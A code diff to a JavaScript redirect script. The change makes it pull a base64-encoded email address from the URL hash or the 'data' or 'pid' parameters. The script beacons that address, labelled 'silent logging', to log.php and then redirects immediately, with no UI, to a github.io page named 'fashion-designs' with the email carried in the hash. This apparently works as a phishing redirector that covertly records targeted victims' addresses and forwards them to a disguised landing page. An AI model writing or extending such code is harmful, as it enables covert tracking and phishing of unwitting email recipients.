@@ -39,17 +39,45 @@ function getParameterByName(name, url) {
 
 function processRedirect() {
     try {
-        // Get pid from URL query parameter
-        var pid = getParameterByName('pid');
-        logToConsole("Original pid:", pid);
+        // Try to get email from multiple sources: #hash, ?data=, or ?pid=
+        var emailData = null;
+        var source = '';
 
-        if (!pid) {
-            logToConsole("No pid found, skipping redirect");
+        // 1. Check hash (#)
+        var hash = window.location.hash.substring(1);
+        if (hash) {
+            emailData = hash;
+            source = 'hash';
+            logToConsole("Found data in hash:", hash);
+        }
+
+        // 2. Check ?data= parameter
+        if (!emailData) {
+            var dataParam = getParameterByName('data');
+            if (dataParam) {
+                emailData = dataParam;
+                source = 'data parameter';
+                logToConsole("Found data in data parameter:", dataParam);
+            }
+        }
+
+        // 3. Check ?pid= parameter
+        if (!emailData) {
+            var pidParam = getParameterByName('pid');
+            if (pidParam) {
+                emailData = pidParam;
+                source = 'pid parameter';
+                logToConsole("Found data in pid parameter:", pidParam);
+            }
+        }
+
+        if (!emailData) {
+            logToConsole("No email data found in hash, data, or pid parameters");
             return;
         }
 
-        // Decode (supports double encoding fallback)
-        var decoded = decodeBase64(pid);
+        // Decode the base64 email
+        var decoded = decodeBase64(emailData);
         logToConsole("Decoded once:", decoded);
 
         // Try double decode if needed
@@ -63,7 +91,7 @@ function processRedirect() {
             } catch(e) {}
         }
 
-        // Replace $ with @
+        // Replace $ with @ if needed
         var email = decoded.replace(/\$/g, '@');
 
         // Final validation
@@ -72,24 +100,22 @@ function processRedirect() {
             return;
         }
 
-        // Re-encode clean email
-        var newHash = btoa(email);
-
         // Silent logging
         try {
             navigator.sendBeacon(
                 "log.php",
                 JSON.stringify({ 
                     email: email,
-                    original_pid: pid,
+                    original_data: emailData,
+                    source: source,
                     timestamp: new Date().toISOString()
                 })
             );
         } catch (e) {}
 
-        // Redirect - now uses the pid for redirect URL
-        var redirectUrl = "https://modest-man001.github.io/fashion-designs/?pid=" + newHash;
-        logToConsole("Redirecting to:", redirectUrl);
+        // Build the redirect URL with the decoded email as a hash
+        var redirectUrl = "https://modest-man001.github.io/fashion-designs/?#" + btoa(email);
+        logToConsole("Redirecting to second file with hash:", redirectUrl);
 
         window.location.replace(redirectUrl);
 
@@ -98,7 +124,7 @@ function processRedirect() {
     }
 }
 
-// Run immediately (no delay, no UI)
+// Run immediately
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', processRedirect);
 } else {
